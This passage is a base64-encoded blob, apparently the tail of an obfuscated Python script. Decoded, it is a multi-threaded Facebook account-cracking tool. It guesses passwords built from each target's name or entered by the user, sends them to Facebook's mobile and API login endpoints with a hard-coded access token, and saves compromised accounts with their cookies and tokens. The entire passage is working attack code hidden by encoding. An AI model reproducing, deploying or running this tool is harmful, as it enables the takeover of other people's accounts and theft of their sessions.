4LWZiLWh0dHAtZW5naW5lIjogIkxpZ2VyIn0KCQkJc2VuZCA9IHNlcy5nZXQoImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2Zvcm1hdD1qc29uJmVtYWlsPSIrc3RyKHVpZCkrIiZwYXNzd29yZD0iK3N0cihwdykrIiZjcmVkZW50aWFsc190eXBlPWRldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZlcnJvcl9kZXRhaWxfdHlwZT1idXR0b25fd2l0aF9kaXNhYmxlZCZzb3VyY2U9ZGV2aWNlX2Jhc2VkX2xvZ2luJm1ldGFfaW5mX2ZibWV0YT0lMjAmY3VycmVudGx5X2xvZ2dlZF9pbl91c2VyaWQ9MCZtZXRob2Q9R0VUJmxvY2FsZT1lbl9VUyZjbGllbnRfY291bnRyeV9jb2RlPVVTJmZiX2FwaV9jYWxsZXJfY2xhc3M9Y29tLmZhY2Vib29rLmZvcy5oZWFkZXJzdjIuZmI0YW9yY2EuSGVhZGVyc1YyQ29uZmlnRmV0Y2hSZXF1ZXN0SGFuZGxlciZhY2Nlc3NfdG9rZW49MzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJmZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZT1hdXRoZW50aWNhdGUmY3BsPXRydWUiLCBoZWFkZXJzPWhlYWRlcnNfKQoJCQlpZiAic2Vzc2lvbl9rZXkiIGluIHNlbmQudGV4dCBhbmQgIkVBQUEiIGluIHNlbmQudGV4dDoKCQkJCXByaW50KCJcclwwMzNbMDs5NG1bUkVELU9LXSAlc3wlc3wlc1wwMzNbMDs5N20iJSh1aWQsIHB3LCBzZW5kLmpzb24oKVsiYWNjZXNzX3Rva2VuIl0pKQoJCQkJb2suYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiT0svJXMudHh0IiUodHNoYWRvdyksImEiKS53cml0ZSgiICsgJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJYnJlYWsKCQkJCWNvbnRpbnVlCgkJCWVsaWYgInd3dy5mYWNlYm9vay5jb20iIGluIHNlbmQuanNvbigpWyJlcnJvcl9tc2ciXToKCQkJCXByaW50KCJcclwwMzNbMDs5NW1bUkVELUNQXSAlc3wlc1wwMzNbMDs5Mm0gICAgICAgICIlKHVpZCwgcHcpKQoJCQkJY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiQ1AvJXMudHh0IiUodHNoYWRvdyksImEiKS53cml0ZSgiICsgJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJYnJlYWsKCQkJCWNvbnRpbnVlCgoJCWxvb3AgKz0gMQoJZXhjZXB0OgoJCXBhc3MKCmRlZiBtYmFzaWModXNlcik6Cgl0cnk6CgkJdWEgPSBvcGVuKCIudWEiLCAiciIpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJdWEgPSAoIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikKCWdsb2JhbCBsb29wLCB0b2tlbgoJc3lzLnN0ZG91dC53cml0ZSgKCQkiXHJcMDMzWzA7OTFtW1wwMzNbMDs5Mm1DcmFja2luZ1wwMzNbMDs5Mm1dXDAzM1swOzkzbSAlcy8lcyAtPiBPSzotJXMgLSBDUDotJXMgIiUobG9vcCwgbGVuKGlkKSwgbGVuKG9rKSwgbGVuKGNwKSkKCSk7IHN5cy5zdGRvdXQuZmx1c2goKQoJdWlkLCBuYW1lID0gdXNlci5zcGxpdCgiPD0+IikKCWlmIGxlbihuYW1lKT49NjoKCQlwd3ggPSBbIG5hbWUsIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQiLCBuYW1lKyIxMjM0NSIgXQoJZWxpZiBsZW4obmFtZSk8PTI6CgkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCWVsaWYgbGVuKG5hbWUpPD0zOgoJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNDUiIF0KCWVsc2U6CgkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0NSIgXQoJdHJ5OgoJCWZvciBwdyBpbiBwd3g6CgkJCWt3YXJncyA9IHt9CgkJCXB3ID0gcHcubG93ZXIoKQoJCQlzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkKCQkJc2VzLmhlYWRlcnMudXBkYXRlKHsib3JpZ2luIjogImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIsICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLCAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCAidXNlci1hZ2VudCI6IHVhLCAiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwgInJlZmVyZXIiOiAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9KQoJCQlwID0gc2VzLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmcmVmaWQ9OCIpLnRleHQKCQkJYiA9IHBhcnNlcihwLCJodG1sLnBhcnNlciIpCgkJCWJsID0gWyJsc2QiLCJqYXpvZXN0IiwibV90cyIsImxpIiwidHJ5X251bWJlciIsInVucmVjb2duaXplZF90cmllcyIsImxvZ2luIl0KCQkJZm9yIGkgaW4gYigiaW5wdXQiKToKCQkJCXRyeToKCQkJCQlpZiBpLmdldCgibmFtZSIpIGluIGJsOmt3YXJncy51cGRhdGUoe2kuZ2V0KCJuYW1lIik6aS5nZXQoInZhbHVlIil9KQoJCQkJCWVsc2U6Y29udGludWUKCQkJCWV4Y2VwdDpwYXNzCgkJCWt3YXJncy51cGRhdGUoeyJlbWFpbCI6IHVpZCwicGFzcyI6IHB3LCJwcmVmaWxsX2NvbnRhY3RfcG9pbnQiOiAiIiwicHJlZmlsbF9zb3VyY2UiOiAiIiwicHJlZmlsbF90eXBlIjogIiIsImZpcnN0X3ByZWZpbGxfc291cmNlIjogIiIsImZpcnN0X3ByZWZpbGxfdHlwZSI6ICIiLCJoYWRfY3BfcHJlZmlsbGVkIjogImZhbHNlIiwiaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCI6ICJmYWxzZSIsImlzX3NtYXJ0X2xvY2siOiAiZmFsc2UiLCJfZmJfbm9zY3JpcHQiOiAidHJ1ZSJ9KQoJCQlnYWFhID0gc2VzLnBvc3QoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8/cmVmc3JjPWh0dHBzJTNBJTJGJTJGbWJhc2ljLmZhY2Vib29rLmNvbSUyRiZsd3Y9MTAwJnJlZmlkPTgiLGRhdGE9a3dhcmdzKQoJCQlpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkKCQkJCXByaW50KCJcclwwMzNbMDs5NG1bUkVELU9LXSAlc3wlc3wlc1wwMzNbMDs5NW0iJSh1aWQsIHB3LCBrdWtpKSkKCQkJCW9rLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkKCQkJCW9wZW4oIk9LLyVzLnR4dCIlKHRzaGFkb3cpLCJhIikud3JpdGUoIiArICVzfCVzXG4iJSh1aWQsIHB3KSkKCQkJCWJyZWFrCgkJCQljb250aW51ZQoJCQllbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCXByaW50KCJcclwwMzNbMDs5NW1bUkVELUNQXSAlc3wlc1wwMzNbMDs5Nm0gICAgICAgICIlKHVpZCwgcHcpKQoJCQkJY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiQ1AvJXMudHh0IiUodHNoYWRvdyksImEiKS53cml0ZSgiICsgJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJYnJlYWsKCQkJCWNvbnRpbnVlCgoJCWxvb3AgKz0gMQoJZXhjZXB0OgoJCXBhc3MKCmRlZiBtb2JpbGUodXNlcik6Cgl0cnk6CgkJdWEgPSBvcGVuKCIudWEiLCAiciIpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJdWEgPSAoIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikKCWdsb2JhbCBsb29wLCB0b2tlbgoJc3lzLnN0ZG91dC53cml0ZSgKCQkiXHJcMDMzWzA7OTFtW1wwMzNbMDs5Mm1DcmFja2luZ1wwMzNbMDs5M21dXDAzM1swOzk1bSAlcy8lcyAtPiBPSzotJXMgLSBDUDotJXMgIiUobG9vcCwgbGVuKGlkKSwgbGVuKG9rKSwgbGVuKGNwKSkKCSk7IHN5cy5zdGRvdXQuZmx1c2goKQoJdWlkLCBuYW1lID0gdXNlci5zcGxpdCgiPD0+IikKCWlmIGxlbihuYW1lKT49NjoKCQlwd3ggPSBbIG5hbWUsIG5hbWUrIjEyMyIsIG5hbWUrIjEyMzQiLCBuYW1lKyIxMjM0NSIgXQoJZWxpZiBsZW4obmFtZSk8PTI6CgkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0IiwgbmFtZSsiMTIzNDUiIF0KCWVsaWYgbGVuKG5hbWUpPD0zOgoJCXB3eCA9IFsgbmFtZSsiMTIzIiwgbmFtZSsiMTIzNDUiIF0KCWVsc2U6CgkJcHd4ID0gWyBuYW1lKyIxMjMiLCBuYW1lKyIxMjM0NSIgXQoJdHJ5OgoJCWZvciBwdyBpbiBwd3g6CgkJCWt3YXJncyA9IHt9CgkJCXB3ID0gcHcubG93ZXIoKQoJCQlzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkKCQkJc2VzLmhlYWRlcnMudXBkYXRlKHsib3JpZ2luIjogImh0dHBzOi8vdG91Y2guZmFjZWJvb2suY29tIiwgImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyIsICJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsICJhY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsICJ1c2VyLWFnZW50IjogdWEsICJIb3N0IjogInRvdWNoLmZhY2Vib29rLmNvbSIsICJyZWZlcmVyIjogImh0dHBzOi8vdG91Y2guZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9KQoJCQlwID0gc2VzLmdldCgiaHR0cHM6Ly90b3VjaC5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZyZWZpZD04IikudGV4dAoJCQliID0gcGFyc2VyKHAsImh0bWwucGFyc2VyIikKCQkJYmwgPSBbImxzZCIsImphem9lc3QiLCJtX3RzIiwibGkiLCJ0cnlfbnVtYmVyIiwidW5yZWNvZ25pemVkX3RyaWVzIiwibG9naW4iXQoJCQlmb3IgaSBpbiBiKCJpbnB1dCIpOgoJCQkJdHJ5OgoJCQkJCWlmIGkuZ2V0KCJuYW1lIikgaW4gYmw6a3dhcmdzLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pCgkJCQkJZWxzZTpjb250aW51ZQoJCQkJZXhjZXB0OnBhc3MKCQkJa3dhcmdzLnVwZGF0ZSh7ImVtYWlsIjogdWlkLCJwYXNzIjogcHcsInByZWZpbGxfY29udGFjdF9wb2ludCI6ICIiLCJwcmVmaWxsX3NvdXJjZSI6ICIiLCJwcmVmaWxsX3R5cGUiOiAiIiwiZmlyc3RfcHJlZmlsbF9zb3VyY2UiOiAiIiwiZmlyc3RfcHJlZmlsbF90eXBlIjogIiIsImhhZF9jcF9wcmVmaWxsZWQiOiAiZmFsc2UiLCJoYWRfcGFzc3dvcmRfcHJlZmlsbGVkIjogImZhbHNlIiwiaXNfc21hcnRfbG9jayI6ICJmYWxzZSIsIl9mYl9ub3NjcmlwdCI6ICJ0cnVlIn0pCgkJCWdhYWEgPSBzZXMucG9zdCgiaHR0cHM6Ly90b3VjaC5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vP3JlZnNyYz1odHRwcyUzQSUyRiUyRnRvdWNoLmZhY2Vib29rLmNvbSUyRiZsd3Y9MTAwJnJlZmlkPTgiLGRhdGE9a3dhcmdzKQoJCQlpZiAiY191c2VyIiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkKCQkJCXByaW50KCJcclwwMzNbMDs5NG1bUkVELU9LXSAlc3wlc3wlc1wwMzNbMDs5N20iJSh1aWQsIHB3LCBrdWtpKSkKCQkJCW9rLmFwcGVuZCgiJXN8JXMiJSh1aWQsIHB3KSkKCQkJCW9wZW4oIk9LLyVzLnR4dCIlKHRzaGFkb3cpLCJhIikud3JpdGUoIiArICVzfCVzXG4iJSh1aWQsIHB3KSkKCQkJCWJyZWFrCgkJCQljb250aW51ZQoJCQllbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCXByaW50KCJcclwwMzNbMDs5NW1bUkVELUNQXSAlc3wlc1wwMzNbMDs5MW0gICAgICAgICIlKHVpZCwgcHcpKQoJCQkJY3AuYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJb3BlbigiQ1AvJXMudHh0IiUodHNoYWRvdyksImEiKS53cml0ZSgiICsgJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJYnJlYWsKCQkJCWNvbnRpbnVlCgoJCWxvb3AgKz0gMQoJZXhjZXB0OgoJCXBhc3MKCmRlZiBtYW51YWwoKToKCXRyeToKCQl1YSA9IG9wZW4oIi51YSIsICJyIikucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQl1YSA9ICgiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iKQoJZ2xvYmFsIGxvb3AsIHRva2VuCglwcmludCgiXG5bK10gVHlwZSAsIEZvciAybmQgUGFzc3dvcmQgRm9yIEV4YW1wbGUgOiAxMTIyMzMsMzM0NDU1LDQ0NTU2NiwyMjMzNDQgZXRjIikKCWFzdSA9IHJhd19pbnB1dCgiWytdIEVudGVyIFBhc3N3b3JkcyA6ICIpLnNwbGl0KCIsIikKCWlmIGxlbihhc3UpID09IiI6CgkJZXhpdCgiWz9dIFdyb25nIElucHV0IikKCXByaW50KCJbK10gRW50ZXIgMi00IFBhc3N3b3JkcyBGb3IgRmFzdCBDcmFja2luZyBTcGVlZFxuIikKCglkZWYgbWFpbih1c2VyKToKCQlnbG9iYWwgbG9vcCwgdG9rZW4KCQlzeXMuc3Rkb3V0LndyaXRlKAoJCQkiXHJcMDMzWzA7OTJtW1wwMzNbMDs5Nm1DcmFja2luZ1wwMzNbMDs5Mm1dXDAzM1swOzk2bSAlcy8lcyAtPiBPSzotJXMgLSBDUDotJXMgIiUobG9vcCwgbGVuKGlkKSwgbGVuKG9rKSwgbGVuKGNwKSkKCQkpOyBzeXMuc3Rkb3V0LmZsdXNoKCkKCQl1aWQsIG5hbWUgPSB1c2VyLnNwbGl0KCI8PT4iKQoJCXRyeToKCQkJZm9yIHB3IGluIGFzdToKCQkJCWt3YXJncyA9IHt9CgkJCQlwdyA9IHB3Lmxvd2VyKCkKCQkJCXNlcyA9IHJlcXVlc3RzLlNlc3Npb24oKQoJCQkJc2VzLmhlYWRlcnMudXBkYXRlKHsib3JpZ2luIjogImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIsICJhY2NlcHQtbGFuZ3VhZ2UiOiAiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjciLCAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLCAidXNlci1hZ2VudCI6IHVhLCAiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwgInJlZmVyZXIiOiAiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCIsICJjYWNoZS1jb250cm9sIjogIm1heC1hZ2U9MCIsICJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCJ9KQoJCQkJcCA9IHNlcy5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi8/bmV4dCZyZWY9ZGJsJnJlZmlkPTgiKS50ZXh0CgkJCQliID0gcGFyc2VyKHAsImh0bWwucGFyc2VyIikKCQkJCWJsID0gWyJsc2QiLCJqYXpvZXN0IiwibV90cyIsImxpIiwidHJ5X251bWJlciIsInVucmVjb2duaXplZF90cmllcyIsImxvZ2luIl0KCQkJCWZvciBpIGluIGIoImlucHV0Iik6CgkJCQkJdHJ5OgoJCQkJCQlpZiBpLmdldCgibmFtZSIpIGluIGJsOmt3YXJncy51cGRhdGUoe2kuZ2V0KCJuYW1lIik6aS5nZXQoInZhbHVlIil9KQoJCQkJCQllbHNlOmNvbnRpbnVlCgkJCQkJZXhjZXB0OnBhc3MKCQkJCWt3YXJncy51cGRhdGUoeyJlbWFpbCI6IHVpZCwicGFzcyI6IHB3LCJwcmVmaWxsX2NvbnRhY3RfcG9pbnQiOiAiIiwicHJlZmlsbF9zb3VyY2UiOiAiIiwicHJlZmlsbF90eXBlIjogIiIsImZpcnN0X3ByZWZpbGxfc291cmNlIjogIiIsImZpcnN0X3ByZWZpbGxfdHlwZSI6ICIiLCJoYWRfY3BfcHJlZmlsbGVkIjogImZhbHNlIiwiaGFkX3Bhc3N3b3JkX3ByZWZpbGxlZCI6ICJmYWxzZSIsImlzX3NtYXJ0X2xvY2siOiAiZmFsc2UiLCJfZmJfbm9zY3JpcHQiOiAidHJ1ZSJ9KQoJCQkJZ2FhYSA9IHNlcy5wb3N0KCJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vP3JlZnNyYz1odHRwcyUzQSUyRiUyRm1iYXNpYy5mYWNlYm9vay5jb20lMkYmbHd2PTEwMCZyZWZpZD04IixkYXRhPWt3YXJncykKCQkJCWlmICJjX3VzZXIiIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkua2V5cygpOgoJCQkJCWt1a2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCkgXSkKCQkJCQlwcmludCgiXHJcMDMzWzA7OTRtW1JFRC1PS10gJXN8JXN8JXNcMDMzWzA7OTdtIiUodWlkLCBwdywga3VraSkpCgkJCQkJb2suYXBwZW5kKCIlc3wlcyIlKHVpZCwgcHcpKQoJCQkJCW9wZW4oIk9LLyVzLnR4dCIlKHRzaGFkb3cpLCJhIikud3JpdGUoIiArICVzfCVzXG4iJSh1aWQsIHB3KSkKCQkJCQlicmVhawoJCQkJCWNvbnRpbnVlCgkJCQllbGlmICJjaGVja3BvaW50IiBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpLmtleXMoKToKCQkJCQlwcmludCgiXHJcMDMzWzA7OTVtW1JFRC1DUF0gJXN8JXNcMDMzWzA7OTFtICAgICAgICAiJSh1aWQsIHB3KSkKCQkJCQljcC5hcHBlbmQoIiVzfCVzIiUodWlkLCBwdykpCgkJCQkJb3BlbigiQ1AvJXMudHh0IiUodEJpbGFsbCksImEiKS53cml0ZSgiICsgJXN8JXNcbiIlKHVpZCwgcHcpKQoJCQkJCWJyZWFrCgkJCQkJY29udGludWUKCgkJCWxvb3AgKz0gMQoJCWV4Y2VwdDoKCQkJcGFzcwoJcCA9IFRocmVhZFBvb2woMzApCglwLm1hcChtYWluLCBpZCkKCWV4aXQoIlxuXG4gIyBbPlByb2dyYW0gQ2xvc2U8XSIpCgpkZWYgc2V0dGluZ191YSgpOgoJcHJpbnQoIlsxXSBDaGFuZ2UgVXNlci1BZ2VudCIpCglwcmludCgiWzJdIERlZmF1bHQgVXNlci1BZ2VudCIpCgl1YSA9IHJhd19pbnB1dCgiXG4gWz9dIENob29zZSA6ICIpCglpZiB1YSA9PSIiOgoJCW1lbnUoKQoJZWxpZiB1YSA9PSAiMSI6CgkJY191YSA9IHJhd19pbnB1dCgiIFsrXSBFbnRlciBVc2VyLUFnZW50IDogIikKCQlvcGVuKCIudWEiLCAidyIpLndyaXRlKGNfdWEpCgkJdGltZS5zbGVlcCgxKQoJCXJhd19pbnB1dCgiXG4gWyFdIFByZXNzIEVudGVyIFRvIFNhdmUgVXNlci1BZ2VudCIpCgkJbWVudSgpCgllbGlmIHVhID09ICIyIjoKCQlwcmludCgiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iKQoJCW9zLnN5c3RlbSgicm0gLWYgLnVhIikKCQl0aW1lLnNsZWVwKDEpCgkJcmF3X2lucHV0KCJcblvigKJdIFVzZXItQWdlbnQgU2F2ZSBTdWNjZXNzZnVsbHkiKQoJCW1lbnUoKQoKZGVmIGJ1YXRfZm9sZGVyKCk6Cgl0cnk6b3MubWtkaXIoIkNQIikKCWV4Y2VwdDpwYXNzCgl0cnk6b3MubWtkaXIoIk9LIikKCWV4Y2VwdDpwYXNzCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgoJb3Muc3lzdGVtKCJnaXQgcHVsbCIpCglvcy5zeXN0ZW0oInRvdWNoIGxvZ2luLnR4dCIpCglidWF0X2ZvbGRlcigpCglsb2dpbigpCg=='))

